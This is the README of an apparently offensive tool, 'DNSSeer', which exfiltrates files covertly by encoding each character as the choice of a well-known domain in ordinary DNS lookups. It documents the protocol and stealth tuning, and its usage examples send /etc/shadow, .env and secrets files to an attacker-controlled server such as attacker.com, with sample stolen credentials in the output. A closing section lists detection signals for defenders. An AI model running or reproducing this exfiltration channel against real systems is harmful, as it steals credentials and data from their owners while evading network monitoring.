# DNSSeer

**DNS Exfiltration Framework** -- The domain IS the data.

> How do you send a secret without sending a secret?
> No plaintext, no encrypted tunnel, no heavyweight queries --
> just ordinary DNS lookups to `google.com`, `x.com`, `claude.ai`...
> each one silently carrying a single character of stolen data.

---

## Table of Contents

- [Concept](#concept)
- [How It Works](#how-it-works)
  - [The Core Idea](#the-core-idea)
  - [Dynamic Mapping](#dynamic-mapping)
  - [Where the Metadata Lives](#where-the-metadata-lives)
  - [Protocol Phases](#protocol-phases)
  - [Full Protocol Flow](#full-protocol-flow)
- [Architecture](#architecture)
  - [File Structure](#file-structure)
  - [domains.py -- Shared Protocol Layer](#domainspy----shared-protocol-layer)
  - [server.py -- Exfiltration Receiver](#serverpy----exfiltration-receiver)
  - [client.py -- Exfiltration Agent](#clientpy----exfiltration-agent)
- [Usage](#usage)
  - [Server](#server)
  - [Client](#client)
  - [Example: Exfiltrating a .env File](#example-exfiltrating-a-env-file)
- [DNS Packet Anatomy](#dns-packet-anatomy)
  - [Transaction ID Layout](#transaction-id-layout)
  - [Control Channel](#control-channel)
  - [Data Channel](#data-channel)
  - [Chunking (Files > 256 chars)](#chunking-files--256-chars)
- [Domain Pool](#domain-pool)
- [Character Set](#character-set)
- [Detection Considerations](#detection-considerations)
- [Limitations](#limitations)

---

## Concept

Traditional DNS exfiltration encodes data in **subdomains** --
`c3VwZXJzZWNyZXQ.evil.com` -- which is trivially detected by
any DNS monitor looking for high-entropy labels.

DNSSeer takes a fundamentally different approach:

```
Infected Machine                          Attacker DNS Server
       |                                          |
       |--- A?  google.com    ------------------>|  'S'  (append char)
       |<-- A   142.250.80.46  ------------------|  (real IP returned)
       |                                          |
       |--- A?  x.com         ------------------>|  'u'  (append char)
       |<-- A   104.244.42.65  ------------------|  (real IP returned)
       |                                          |
       |--- A?  claude.ai     ------------------>|  'p'  (append char)
       |<-- A   104.18.8.221   ------------------|  (real IP returned)
```

Every single query is a **legitimate DNS lookup** to a **real, well-known
domain**.  The server forwards each query to upstream DNS (8.8.8.8) and
returns the **real IP address**.  To any network monitor, firewall, or IDS,
this is indistinguishable from normal web browsing traffic.

The secret is encoded in the **choice** of domain -- not the domain name
itself, not the query content, not the response.  Just which domain you
asked about.

---

## How It Works

### The Core Idea

DNSSeer maps 98 well-known domains to 98 characters (95 printable ASCII
plus `\n`, `\t`, `\r`).  To exfiltrate the character `'S'`, the client
queries whichever domain currently maps to `'S'`.  The server sees the
domain, looks up the character, and appends it to the reconstructed file.

```
Character:  'S'  'u'  'p'  'e'  'r'
Domain:      ?    ?    ?    ?    ?     <-- depends on session seed
```

### Dynamic Mapping

The mapping is **not hardcoded**.  Every session negotiates a fresh,
randomized char-to-domain permutation:

1. Client sends a `SESSION_START` query (A record for `googleapis.com`)
2. Server generates a random 32-bit seed
3. Server returns the seed **encoded as the response IP address**
   (e.g., seed `0x37BC2AE9` -> IP `55.188.42.233`)
4. Both sides feed the seed into the same deterministic PRNG:
   ```python
   rng = random.Random(seed)
   perm = list(range(98))
   rng.shuffle(perm)
   ```
5. Both sides now have identical char-to-domain tables

This means:
- Session 1: `'S'` -> `openai.com`
- Session 2: `'S'` -> `netflix.com`
- Session 3: `'S'` -> `github.com`

An analyst comparing traffic from different exfiltration sessions sees
completely different query patterns for the same data.

### Where the Metadata Lives

Every piece of information is encoded in standard DNS packet fields --
nothing is added, nothing looks anomalous:

| DNS Field | Encodes | Range |
|---|---|---|
| **Queried domain** | The character (via dynamic permutation) | 98 domains |
| **QTYPE** | Phase: `A`=content, `AAAA`=hostname, `MX`=filename | 3 types |
| **TX ID high byte** | `client_id` -- identifies the sending machine | 0-255 |
| **TX ID low byte** | `seq_num` -- character position in stream | 0-255 |
| **Response IP** | 32-bit PRNG seed (SESSION_START only) | 4 bytes |
| **googleapis.com** | Control signal (seq byte = command code) | fixed |

### Protocol Phases

The exfiltration happens in sequential phases, each using a different
DNS query type to separate the data streams:

```
Phase 0: SESSION_START     A    googleapis.com    --> seed in response IP
Phase 1: Hostname chars    AAAA (various domains) --> machine identity
Phase 2: Filename chars    MX   (various domains) --> what file is this
Phase 3: Content chars     A    (various domains) --> the actual data
```

Using different QTYPEs means the server can unambiguously identify what
each character belongs to, even if phases overlap or packets arrive
out of order.

### Full Protocol Flow

```
CLIENT                                              SERVER
  |                                                     |
  |  SESSION_START                                      |
  |  A? googleapis.com  txid=0x2A00                     |
  |------------------------------------------------------>
  |                          seed=0x37BC2AE9            |
  |                          IP=55.188.42.233           |
  |<------------------------------------------------------
  |                                                     |
  |  Both: Random(0x37BC2AE9).shuffle([0..97])          |
  |        'D' -> expedia.com                           |
  |        'B' -> wikipedia.org                         |
  |        ...                                          |
  |                                                     |
  |  HOSTNAME PHASE (AAAA queries)                      |
  |  AAAA? paypal.com      txid=0x2A00  --> 'H'        |
  |  AAAA? dailymotion.com txid=0x2A01  --> 'a'        |
  |  AAAA? bloomberg.com   txid=0x2A02  --> 'c'        |
  |  AAAA? x.com           txid=0x2A03  --> 'k'        |
  |  ...                                                |
  |  END_HOSTNAME                                       |
  |  A? googleapis.com     txid=0x2A01                  |
  |------------------------------------------------------>
  |                     hostname = "HackBook"           |
  |                                                     |
  |  FILENAME PHASE (MX queries)                        |
  |  MX? whatsapp.com      txid=0x2A00  --> 't'        |
  |  MX? opentable.com     txid=0x2A01  --> 'e'        |
  |  MX? nytimes.com       txid=0x2A02  --> 's'        |
  |  MX? whatsapp.com      txid=0x2A03  --> 't'        |
  |  MX? imdb.com          txid=0x2A04  --> '.'        |
  |  ...                                                |
  |  END_FILENAME                                       |
  |  A? googleapis.com     txid=0x2A02                  |
  |------------------------------------------------------>
  |                     filename = "test.env"           |
  |                                                     |
  |  CONTENT PHASE (A queries)                          |
  |  A? expedia.com        txid=0x2A00  --> 'D'        |
  |  A? wikipedia.org      txid=0x2A01  --> 'B'        |
  |  A? evernote.com       txid=0x2A02  --> '_'        |
  |  A? paypal.com         txid=0x2A03  --> 'H'        |
  |  A? flickr.com         txid=0x2A04  --> 'O'        |
  |  A? duckduckgo.com     txid=0x2A05  --> 'S'        |
  |  ...                                                |
  |  END_CONTENT                                        |
  |  A? googleapis.com     txid=0x2A03                  |
  |------------------------------------------------------>
  |                     content assembled, saved        |
  |                     to loot/HackBook_test.env       |
```

Every data query is forwarded to upstream DNS and returns a **real IP**.
The client actually resolves every domain it queries.

---

## Architecture

### File Structure

```
DNSSeer/
  domains.py    Shared protocol: domain pool, character set,
                DNS wire-format helpers, permutation generation,
                TX ID encoding, control codes

  server.py     DNS server: listens for queries, decodes hidden
                data, tracks sessions, forwards to upstream DNS,
                writes exfiltrated files to loot/

  client.py     DNS client (pure Python): reads target file,
                negotiates dynamic mapping, sends one DNS query
                per character with configurable timing
```

Zero external dependencies.  Everything uses the Python 3 standard
library (`socket`, `struct`, `random`, `argparse`).

### domains.py -- Shared Protocol Layer

**Domain Pool** -- 98 well-known domains covering all categories:

| Category | Examples | Count |
|---|---|---|
| Big Tech | google.com, apple.com, microsoft.com, amazon.com | ~15 |
| Social | facebook.com, twitter.com, reddit.com, tiktok.com | ~10 |
| Shopping | ebay.com, walmart.com, shopify.com, etsy.com | ~8 |
| News | cnn.com, bbc.com, reuters.com, bloomberg.com | ~10 |
| Entertainment | netflix.com, spotify.com, hulu.com, twitch.tv | ~10 |
| Travel | airbnb.com, booking.com, uber.com, expedia.com | ~8 |
| Dev/Cloud | github.com, cloudflare.com, stackoverflow.com | ~8 |
| Productivity | slack.com, zoom.us, notion.so, dropbox.com | ~10 |
| Education | wikipedia.org, coursera.org, khanacademy.org | ~8 |
| AI | claude.ai, anthropic.com, openai.com | 3 |
| Other | tesla.com, spacex.com, oracle.com, x.com | ~8 |

**DNS Wire-Format Helpers** -- pure Python implementations of:

| Function | Purpose |
|---|---|
| `encode_domain_name()` | Domain string -> DNS label wire format |
| `decode_domain_name()` | Wire format -> domain string (with pointer decompression) |
| `build_dns_query()` | Construct a complete DNS query packet |
| `parse_dns_query()` | Extract (txid, qname, qtype) from a query packet |
| `build_dns_response()` | Construct an A-record response with a given IP |
| `parse_a_record()` | Extract IP bytes from a DNS response |
| `build_servfail()` | Construct a SERVFAIL response |

**Dynamic Mapping Functions:**

| Function | Purpose |
|---|---|
| `generate_permutation(seed)` | Deterministic shuffle of 0-97 from a 32-bit seed |
| `build_char_to_domain(perm)` | Permutation -> `{char: domain}` (client-side encoding) |
| `build_domain_to_char(perm)` | Permutation -> `{domain: char}` (server-side decoding) |
| `seed_to_ip(seed)` | 32-bit int -> dotted-decimal IP string |
| `ip_to_seed(ip_bytes)` | 4-byte IP -> 32-bit int |

### server.py -- Exfiltration Receiver

The server is a UDP DNS server that:

1. **Listens** on a configurable port (default 5353)
2. **Identifies** control vs. data packets by domain and QTYPE
3. **Tracks** per-client sessions with a state machine:
   ```
   INIT -> HOSTNAME -> FILENAME -> CONTENT -> COMPLETE
   ```
4. **Decodes** each character using the session's dynamic mapping
5. **Forwards** every query to upstream DNS for legitimate responses
6. **Assembles** characters in sequence-number order
7. **Writes** completed files to the `loot/` directory
8. **Prints** real-time debug info: partial strings, progress, session stats

**Session State:**

```python
class Session:
    client_id      # 0-255, from TX ID high byte
    source_ip      # client's IP address
    seed           # 32-bit PRNG seed for this session
    domain_to_char # {domain: char} derived from seed
    phase          # current state in the protocol
    hostname_buf   # {seq: char} for hostname data
    filename_buf   # {seq: char} for filename data
    content_buf    # {position: char} for file content
    content_chunk  # current 256-char chunk index
```

**Server Output:**

The server prints real-time colored debug output showing:
- Session registration (client ID, source IP, seed)
- Hostname assembly character by character
- Filename assembly character by character
- Content reception with position tracking
- Completion summary with full content dump
- Active/completed session statistics

### client.py -- Exfiltration Agent

Pure Python client with zero dependencies.  Reads a target file and
exfiltrates it through DNS queries.

**Exfiltration flow:**

1. Read the target file
2. Get the local hostname (via `socket.gethostname()`)
3. Send `SESSION_START`, receive seed from response IP
4. Build dynamic mapping from seed
5. Send hostname characters as AAAA queries
6. Send filename characters as MX queries
7. Send file content as A queries (with automatic chunking)
8. Print summary statistics

**Client features:**
- Configurable delay and jitter between queries
- Automatic retry on SESSION_START (up to 3 attempts)
- Progress bar in normal mode, per-query log in verbose mode
- Warning for unsupported characters (silently skipped)
- Random or user-specified client ID

---

## Usage

### Server

```bash
python3 server.py [-p PORT] [-u UPSTREAM] [-l LOOT_DIR]
```

| Argument | Default | Description |
|---|---|---|
| `-p, --port` | `5353` | UDP listen port |
| `-u, --upstream` | `8.8.8.8` | Upstream DNS resolver for real responses |
| `-l, --loot-dir` | `./loot` | Directory to save exfiltrated files |

**Examples:**

```bash
# Default: listen on 5353, forward to 8.8.8.8
python3 server.py

# Production: listen on port 53 (requires root), custom loot directory
sudo python3 server.py -p 53 -l /var/loot

# Use Cloudflare DNS as upstream
python3 server.py -u 1.1.1.1
```

### Client

```bash
python3 client.py -s SERVER -f FILE [-p PORT] [-c ID] [-d DELAY] [-j JITTER] [-v]
```

| Argument | Default | Description |
|---|---|---|
| `-s, --server` | (required) | DNSSeer server IP address |
| `-f, --file` | (required) | Path to the file to exfiltrate |
| `-p, --port` | `5353` | Server UDP port |
| `-c, --client-id` | random 1-255 | Client identifier (0-255) |
| `-d, --delay` | `100` | Delay between queries in milliseconds |
| `-j, --jitter` | `50` | Random +/- jitter in milliseconds |
| `-v, --verbose` | off | Show every query with domain mapping |

**Examples:**

```bash
# Basic exfiltration
python3 client.py -s 192.168.1.100 -f /etc/shadow

# Slow and stealthy (500ms +/- 200ms between queries)
python3 client.py -s 10.0.0.5 -f .env -d 500 -j 200

# Fast with verbose output (see every domain mapping)
python3 client.py -s 127.0.0.1 -f secrets.txt -d 10 -j 5 -v

# Specific client ID and custom port
python3 client.py -s attacker.com -p 53 -f config.yml -c 42
```

### Example: Exfiltrating a .env File

**Target file (`/app/.env`):**

```
DB_HOST=localhost
DB_PORT=5432
DB_PASS=SuperOffA7Pasword!@
API_KEY=sk-1337-s3cr3t
```

**Terminal 1 -- Start the server:**

```
$ python3 server.py

    ____  _   _______ _____
   / __ \/ | / / ___// ___/___  ___  _____
  / / / /  |/ /\__ \ \__ \/ _ \/ _ \/ ___/
 / /_/ / /|  /___/ /___/ /  __/  __/ /
/_____/_/ |_//____//____/\___/\___/_/

  DNS Exfiltration Framework  ·  v1.0
  The domain IS the data.  Dynamic mapping.

  Listen addr    0.0.0.0:5353
  Upstream DNS   8.8.8.8:53
  Loot dir       ./loot/
  Ctrl domain    googleapis.com
  Domain pool    98 domains  (mapping randomised per session)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[23:49:42] [READY] Waiting for exfiltration sessions ...
```

**Terminal 2 -- Run the client:**

```
$ python3 client.py -s 127.0.0.1 -f .env -c 42 -d 10 -j 5 -v

  Server       127.0.0.1:5353
  Client ID    #42
  Hostname     HackBook
  File         .env  ->  ".env"
  Content      82 chars
  Est. queries ~98
  Delay        10.0ms  +/-5.0ms jitter

  SESSION_START  ->  requesting dynamic mapping ...
      seed = 0x37BC2AE9  ->  mapping built (98 chars)

  -- sample mapping --
    'A' -> bestbuy.com
    'B' -> wikipedia.org
    'C' -> zillow.com
    'a' -> dailymotion.com
    'b' -> snapchat.com
    'c' -> bloomberg.com
    '0' -> archive.org
    '1' -> tripadvisor.com
    '9' -> signal.org

  Sending hostname  "HackBook"  (8 chars, AAAA queries)
    23:49:43.012  'H' -> paypal.com          AAAA  seq=0    ok
    23:49:43.028  'a' -> dailymotion.com     AAAA  seq=1    ok
    23:49:43.041  'c' -> bloomberg.com       AAAA  seq=2    ok
    23:49:43.055  'k' -> x.com              AAAA  seq=3    ok
    ...
```

**Server output (simultaneous):**

```
[23:49:43] [ INIT] Client #42 from 127.0.0.1  seed=0x37BC2AE9  ->  mapping generated
[23:49:43] [STATS] Active: 1  |  Completed: 0
[23:49:43] [ HOST] Client #42 | "H"  <- paypal.com (AAAA)
[23:49:43] [ HOST] Client #42 | "Ha"  <- dailymotion.com (AAAA)
[23:49:43] [ HOST] Client #42 | "Hac"  <- bloomberg.com (AAAA)
...
[23:49:43] [ HOST] Client #42 | hostname complete: "HackBook"  (8 queries)
[23:49:43] [ FILE] Client #42 | filename complete: ".env"  (4 queries)
[23:49:44] [ DATA] Client #42 | pos    0 'D' <- expedia.com (A)  [1 chars]
[23:49:44] [ DATA] Client #42 | pos    1 'B' <- wikipedia.org (A)  [2 chars]
...

============================================================
  EXFILTRATION COMPLETE
============================================================
  Client ID   #42
  Source IP   127.0.0.1
  Hostname    HackBook
  Filename    .env
  Size        82 bytes
  Duration    2.1s
  DNS queries 98
  Seed        0x37BC2AE9
------------------------------------------------------------
  Content:
  DB_HOST=localhost
  DB_PORT=5432
  DB_PASS=SuperOffA7Pasword!@
  API_KEY=sk-1337-s3cr3t
------------------------------------------------------------
  Saved to    loot/HackBook_.env
============================================================
```

---

## DNS Packet Anatomy

### Transaction ID Layout

The 16-bit DNS Transaction ID is repurposed to carry metadata:

```
 15  14  13  12  11  10   9   8   7   6   5   4   3   2   1   0
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
|           client_id           |           seq_num             |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
         (high byte)                     (low byte)
```

- **client_id** (8 bits): Identifies the sending machine (0-255).
  Allows the server to multiplex up to 256 concurrent exfiltration
  sessions.
- **seq_num** (8 bits): Character position within the current phase
  (0-255).  Wraps with chunking for longer content.

Example: `txid = 0x2A03` -> `client_id = 42`, `seq_num = 3`

### Control Channel

All control signals are **A queries to `googleapis.com`** -- the most
commonly queried domain on the internet.  The `seq_num` byte in the
Transaction ID determines the control command:

| seq | Command | Purpose |
|---|---|---|
| `0` | `SESSION_START` | Register client, negotiate mapping (seed in response IP) |
| `1` | `END_HOSTNAME` | Hostname phase complete |
| `2` | `END_FILENAME` | Filename phase complete |
| `3` | `END_CONTENT` | Content phase complete (session done) |
| `4` | `NEXT_CHUNK` (chunk 1) | Sequence counter wrapped, starting next 256-char block |
| `5` | `NEXT_CHUNK` (chunk 2) | ... |
| `N` | `NEXT_CHUNK` (chunk N-3) | Chunk number = seq - 3 |

Control queries to `googleapis.com` are invisible in DNS logs.  A single
machine making periodic A queries to `googleapis.com` is the most
ordinary traffic imaginable.

### Data Channel

Data is carried by the **choice of queried domain**.  The QTYPE
differentiates which data stream a character belongs to:

| QTYPE | Record Type | Phase | Purpose |
|---|---|---|---|
| `A` (1) | Address | Content | File content characters |
| `AAAA` (28) | IPv6 Address | Hostname | Source machine identity |
| `MX` (15) | Mail Exchange | Filename | Name of exfiltrated file |

Every data query is forwarded to upstream DNS.  The response contains
the **real DNS record** for that domain -- A queries get real IPs, AAAA
queries get real IPv6 addresses, MX queries get real mail servers.

### Chunking (Files > 256 chars)

The sequence number is 8 bits (0-255), limiting each phase to 256
characters.  For larger files, the client sends a `NEXT_CHUNK` control
signal and resets the sequence counter:

```
Characters 0-255:    seq 0-255, chunk 0   (absolute pos = 0*256 + seq)
  NEXT_CHUNK (seq=4)
Characters 256-511:  seq 0-255, chunk 1   (absolute pos = 1*256 + seq)
  NEXT_CHUNK (seq=5)
Characters 512-767:  seq 0-255, chunk 2   (absolute pos = 2*256 + seq)
  ...
```

Maximum file size: 252 chunks * 256 chars = **64,512 characters**.

---

## Domain Pool

The 98 domains in the data-encoding pool, in static index order:

| Index | Domain | Index | Domain | Index | Domain |
|---|---|---|---|---|---|
| 0 | google.com | 33 | cnn.com | 66 | notion.so |
| 1 | youtube.com | 34 | bbc.com | 67 | trello.com |
| 2 | facebook.com | 35 | nytimes.com | 68 | slack.com |
| 3 | twitter.com | 36 | reuters.com | 69 | zoom.us |
| 4 | instagram.com | 37 | forbes.com | 70 | skype.com |
| 5 | linkedin.com | 38 | bloomberg.com | 71 | evernote.com |
| 6 | reddit.com | 39 | wsj.com | 72 | todoist.com |
| 7 | pinterest.com | 40 | theguardian.com | 73 | asana.com |
| 8 | tumblr.com | 41 | washingtonpost.com | 74 | wikipedia.org |
| 9 | snapchat.com | 42 | usatoday.com | 75 | quora.com |
| 10 | github.com | 43 | espn.com | 76 | khanacademy.org |
| 11 | stackoverflow.com | 44 | weather.com | 77 | coursera.org |
| 12 | microsoft.com | 45 | imdb.com | 78 | udemy.com |
| 13 | apple.com | 46 | rottentomatoes.com | 79 | edx.org |
| 14 | amazon.com | 47 | hulu.com | 80 | duolingo.com |
| 15 | netflix.com | 48 | disneyplus.com | 81 | archive.org |
| 16 | spotify.com | 49 | soundcloud.com | 82 | britannica.com |
| 17 | twitch.tv | 50 | vimeo.com | 83 | dictionary.com |
| 18 | discord.com | 51 | dailymotion.com | 84 | yahoo.com |
| 19 | telegram.org | 52 | deviantart.com | 85 | bing.com |
| 20 | ebay.com | 53 | flickr.com | 86 | duckduckgo.com |
| 21 | walmart.com | 54 | booking.com | 87 | brave.com |
| 22 | target.com | 55 | expedia.com | 88 | whatsapp.com |
| 23 | bestbuy.com | 56 | tripadvisor.com | 89 | signal.org |
| 24 | etsy.com | 57 | airbnb.com | 90 | tiktok.com |
| 25 | shopify.com | 58 | uber.com | 91 | claude.ai |
| 26 | paypal.com | 59 | lyft.com | 92 | anthropic.com |
| 27 | stripe.com | 60 | zillow.com | 93 | openai.com |
| 28 | squarespace.com | 61 | realtor.com | 94 | x.com |
| 29 | wix.com | 62 | yelp.com | 95 | tesla.com |
| 30 | godaddy.com | 63 | opentable.com | 96 | spacex.com |
| 31 | namecheap.com | 64 | dropbox.com | 97 | oracle.com |
| 32 | cloudflare.com | 65 | box.com | | |

Plus the control domain: **`googleapis.com`** (not in the data pool,
used exclusively for control signals).

With dynamic mapping, the index-to-character assignment is shuffled
per session.  The static indices above are the *pool order*, not the
character mapping.

---

## Character Set

98 characters are supported -- all printable ASCII plus essential
whitespace:

| Range | Characters | Count |
|---|---|---|
| 0x20-0x7E | ` !"#$%&'()*+,-./0-9:;<=>?@A-Z[\]^_``a-z{\|}~` | 95 |
| 0x0A | `\n` (newline) | 1 |
| 0x09 | `\t` (tab) | 1 |
| 0x0D | `\r` (carriage return) | 1 |

Characters outside this set (binary data, Unicode, control characters
other than `\n`/`\t`/`\r`) are silently skipped with a warning.

---

## Detection Considerations

DNSSeer is designed for **authorized penetration testing** and
**security research**.  Understanding the detection surface helps
defenders build better monitoring:

**What makes it hard to detect:**
- Every query is to a well-known, legitimate domain
- Every response contains the real IP address for that domain
- Query types (A, AAAA, MX) are normal DNS operations
- `googleapis.com` control queries blend into omnipresent background noise
- Dynamic per-session mapping defeats signature-based detection
- Transaction IDs look like normal 16-bit random values
- No unusual record types, no EDNS options, no anomalous flags

**What might reveal it:**
- **Volume pattern**: 80+ DNS queries to 80 different domains in rapid
  succession from one host is unusual.  Adding delay (`-d`) and jitter
  (`-j`) helps but doesn't fully eliminate the pattern.
- **Domain diversity**: A single host resolving dozens of unrelated
  domains (ebay.com, khanacademy.org, rottentomatoes.com) in seconds
  is atypical for most workloads.
- **Repeated googleapis.com**: Multiple A queries for googleapis.com
  with unusual TX ID patterns could stand out under deep inspection.
- **AAAA/MX distribution**: Legitimate traffic has a very low ratio
  of AAAA and MX queries compared to A queries.  DNSSeer's hostname
  and filename phases invert this ratio temporarily.
- **No follow-up connections**: Resolving google.com but never
  connecting to 142.250.x.x is suspicious to behavioral analysis.

---

## Limitations

- **Speed**: One character per DNS query.  At 100ms delay, a 1KB file
  takes ~100 seconds.  Suitable for small, high-value targets
  (credentials, keys, configs), not large files.
- **File size**: Maximum 64,512 characters per session (252 chunks
  x 256 chars).  Sufficient for most text config files.
- **Character set**: Only printable ASCII + newline/tab/CR.  Binary
  files, Unicode text, and other encodings are not supported directly
  (would need base64 pre-encoding on the client side).
- **Reliability**: UDP has no delivery guarantee.  Lost packets mean
  missing characters.  The sequence numbering enables detection of
  gaps but not automatic retransmission.
- **Concurrent clients**: Up to 256 (limited by the 8-bit client_id
  in the Transaction ID).
- **Server placement**: The attacker must control the DNS server that
  the target machine queries.  This typically requires either being
  configured as the machine's DNS resolver or being an authoritative
  nameserver in the resolution chain.
